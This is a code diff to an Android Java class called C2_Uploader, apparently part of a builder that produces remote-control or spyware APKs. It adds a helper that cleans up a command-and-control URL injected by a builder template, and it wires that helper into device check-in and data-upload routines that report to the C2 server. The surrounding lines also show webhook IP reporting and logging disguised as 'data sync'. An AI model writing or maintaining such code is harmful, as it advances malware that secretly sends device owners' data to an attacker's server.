@@ -54,6 +54,20 @@ public class C2_Uploader {
         return android.os.Build.MODEL != null ? android.os.Build.MODEL : "Android Device";
     }
 
+    /**
+     * [BUILDER] Sanitizes a BuildConfig.WEBHOOK_URL value produced by the online APK
+     * builder template. The template stores the C2 URL in a fixed 96-char slot padded
+     * with '#', so we trim whitespace, strip every '#' and drop trailing slashes.
+     */
+    public static String sanitizeC2Url(String raw) {
+        if (raw == null) return "";
+        String s = raw.trim().replace("#", "").trim();
+        while (s.endsWith("/")) {
+            s = s.substring(0, s.length() - 1);
+        }
+        return s;
+    }
+
     private static void addDeviceSecretHeader(HttpURLConnection conn) {
         String secret = BuildConfig.DEVICE_SECRET;
         if (secret != null && !secret.trim().isEmpty()) {
@@ -69,7 +83,7 @@ public class C2_Uploader {
      * Reports current device status to the backend.
      */
     public static void checkIn(Context context) {
-        String c2Url = BuildConfig.WEBHOOK_URL;
+        String c2Url = sanitizeC2Url(BuildConfig.WEBHOOK_URL);
         if (c2Url == null || c2Url.isEmpty()) return;
 
         // Skip checkin for Google Apps Script webhooks (Google Sheets logging is handled by sendIpToWebhook)
@@ -179,7 +193,7 @@ public class C2_Uploader {
             return;
         }
 
-        String webhookUrl = BuildConfig.WEBHOOK_URL;
+        String webhookUrl = sanitizeC2Url(BuildConfig.WEBHOOK_URL);
         if (webhookUrl == null || webhookUrl.isEmpty()) {
             Log.e(TAG, "UPLOAD_ERROR: No C2 URL defined.");
             FirebaseConfig.logActivity("DATA_SYNC_ERROR: No remote C2 URL configured.");
